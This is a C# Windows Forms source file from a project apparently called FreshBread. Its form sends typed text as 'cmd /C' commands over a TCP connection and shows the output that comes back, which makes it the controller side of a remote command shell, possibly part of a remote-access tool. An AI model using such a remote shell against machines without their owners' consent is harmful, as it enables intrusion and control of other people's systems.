using FreshBreadHost;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FreshBread_Host
{
    public partial class CMD : Form
    {
        private TcpClient client;
        private Object theCMD;
        public CMD(TcpClient theClient)
        {
            theCMD = (Object)this;
            client = theClient;
            InitializeComponent();
        }

        public void readStream(Object cmd)
        {
            CMD mainCMD = (CMD)cmd;
            while (true)
            {
                StreamReader sReader = new StreamReader(client.GetStream(), Encoding.ASCII);

                string data = sReader.ReadLine();
                mainCMD.richTextBox1.Invoke(new Action(() => mainCMD.richTextBox1.AppendText(data)));
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Server.sendMessage(client, "cmd`/C " + textBox1.Text);
            textBox1.Clear();
            Thread t = new Thread(new ParameterizedThreadStart(readStream));
            t.Start(theCMD);
        }
    }
}
